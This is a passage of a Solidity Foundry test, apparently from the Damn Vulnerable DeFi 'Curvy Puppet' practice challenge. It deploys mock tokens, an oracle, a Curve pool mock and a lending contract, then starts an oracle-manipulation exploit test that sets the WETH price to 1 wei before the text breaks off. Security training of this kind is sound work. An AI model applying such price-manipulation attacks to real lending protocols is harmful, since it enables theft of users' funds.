        dvt = new DamnValuableToken();
        weth = new DamnValuableToken();
        oracle = new CurvyPuppetOracle();
        oracle.setPrice(address(weth), 1e18, block.timestamp + 1 days); // 1 WETH = 1e18 wei
        oracle.setPrice(address(dvt), 2e18, block.timestamp + 1 days); // 1 DVT = 2 WETH
        address lpToken = address(new DamnValuableToken());
        curvePool = new CurvePoolMock(address(weth), lpToken);
        lending = new CurvyPuppetLending(
            address(dvt),
            address(curvePool),
            address(0),
            address(oracle)
        );
        dvt.approve(address(lending), type(uint256).max);
        weth.approve(address(curvePool), type(uint256).max);
        vm.deal(USER, 100 ether);
        dvt.transfer(USER, 100 ether);
        vm.startPrank(USER);
        dvt.approve(address(lending), 100 ether);
        lending.deposit(100 ether); // Deposit 100 DVT
        vm.stopPrank();
    }

    function test_exploit_via_oracle_manipulation() public {
        // Record normal collateral value and max borrow value
        uint256 collateralValueNormal = lending.getCollateralValue(100 ether);
        uint256 maxBorrowValueNormal = collateralValueNormal * 100 / 175;

        // Manipulate oracle: set WETH price to 1 wei (extremely low)
        vm.prank(address(oracle));
        oracle.setPrice(address(weth), 1, block.timestamp + 1 days);

        // Calculate borrowable amount with manipulated oracle
